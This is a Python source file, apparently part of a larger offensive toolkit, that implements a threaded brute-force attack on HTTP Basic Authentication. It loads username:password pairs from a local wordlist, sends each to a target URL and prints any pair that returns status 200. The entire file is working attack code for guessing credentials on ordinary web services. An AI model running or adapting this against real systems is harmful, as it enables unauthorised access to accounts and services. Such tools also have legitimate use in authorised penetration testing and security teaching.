import threading
import os
import requests
from requests.auth import HTTPBasicAuth
from .misc import *


class HTTPBrute(threading.Thread):
    def __init__(self, target):
        """
        Default constrictor.
        :param target:
        :return:
        """
        threading.Thread.__init__(self)
        self.target = target

    def http_brute(self, hostname, username, password):
        """
        Runs the HTTP brute force function on the HTTP service.
        :param hostname:
        :param username:
        :param password:
        :return True:
        """
        check = requests.get(hostname, auth=HTTPBasicAuth(username, password))
        r = check.status_code
        if r == 200:
            print(print_green(f"\n[HTTP] Found combo:\n\tHostname: {hostname}\n\tUsername: {username}\n\tPassword: {password}"))
            return True
        elif r == 401:
            pass

    def run(self):
        """
         Reads the wordlist and runs the brute force function on the HTTP service.
        :param:
        :return:
        """
        # Read the file
        parent_dir = os.getcwd()
        wordlist_path = os.path.join(parent_dir, "data", "wordlists", "http_wordlist.txt")
        cred_list = open(wordlist_path).read().splitlines()

        # Start the brute force
        for cred in cred_list:
            username = cred.split(':')[0]
            password = cred.split(':')[1]

            if self.http_brute(self.target, username, password):
                break
